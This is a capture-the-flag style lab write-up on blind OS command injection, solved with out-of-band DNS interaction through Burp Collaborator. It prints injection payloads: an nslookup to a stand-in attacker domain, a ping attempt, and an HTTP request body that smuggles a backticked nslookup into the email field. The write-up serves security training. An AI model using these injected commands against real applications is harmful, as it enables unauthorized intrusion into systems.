# Lab Blind OS command injection with out-of-band interaction

## Objective:

 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 

## Big Idea:

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

`& nslookup kgji2Ohoyw.web-attacker.com &`

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring , and thereby detect that the command was successfully injected. 

This is what the landing page looks like.

![image](https://user-images.githubusercontent.com/90155329/135768102-7831ee20-ac01-478c-89a9-594820d97651.png)

I visited the "Submit feedback" function which responded with the following page.

![image](https://user-images.githubusercontent.com/90155329/135768110-bb6f8d56-297c-49ac-ba79-eb1915a703ba.png)

One of these user input fields runs a command in the background and is vulnerable to OS command injection. 

Since this lab is focused on out of band techniques, I will start Burp Collaborator. Burp Collaborator acts as a listener and can be used to test out of band command injections. 

To Start Burp Collaborator visit Burp > Burp Collaborator Client

![image](https://user-images.githubusercontent.com/90155329/135768125-a8b94fae-0b98-4481-a0bb-ce87b588fdda.png)

To get my unique subdomain, click "Copy to clipboard"

![image](https://user-images.githubusercontent.com/90155329/135768134-2934bd9f-0d08-4c37-ac29-108818e712e5.png)

My unique domain is the following
j8swo5h0vh9kafljvq2tlq72mtsjg8.burpcollaborator.net

Any traffic that gets sent to the above domain will be displayed in my Burp Collaborator client. 

Back to the feedback, page I sent the following values and intercepted the request with Burp Intercept.

![image](https://user-images.githubusercontent.com/90155329/135768143-cae2f256-b70c-4947-be2f-e21fb94e6ed4.png)

![image](https://user-images.githubusercontent.com/90155329/135768151-bf13b63a-1ef5-4f27-be68-60a4530cd28a.png)

I sent the request to repeater and tried injecting a payload which would have the server ping itself 

ping -c 20 127.0.0.1

![image](https://user-images.githubusercontent.com/90155329/135768155-c5f2eb6a-c4e9-43c8-9d42-71fdc2f5a060.png)

This payload did not work. 

I will try doing an nslookup on my burp collaborator client

The following command performs the dns request

` nslookup j8swo5h0vh9kafljvq2tlq72mtsjg8.burpcollaborator.net `

The following is what the command injection looks like inside of the http body

` csrf=qinivqp5NIpW6K2K5CO3O0eogtqjfBKf&name=bagelHacks&email=bagelHacks%40hacker.hacker`nslookup+j8swo5h0vh9kafljvq2tlq72mtsjg8.burpcollaborator.net`&subject=test&message=testing+ `

![image](https://user-images.githubusercontent.com/90155329/135768169-c048eb17-bf45-4951-ae5b-a1990aef8c10.png)


From Burp Collaborator, I can see DNS queries which means the nslookup command was successful on the target web server

![image](https://user-images.githubusercontent.com/90155329/135768175-b507620c-7b46-41db-bc89-2d02a9f94c1d.png)

![image](https://user-images.githubusercontent.com/90155329/135768181-601379ed-748a-4fa2-8e77-beac65a748ef.png)






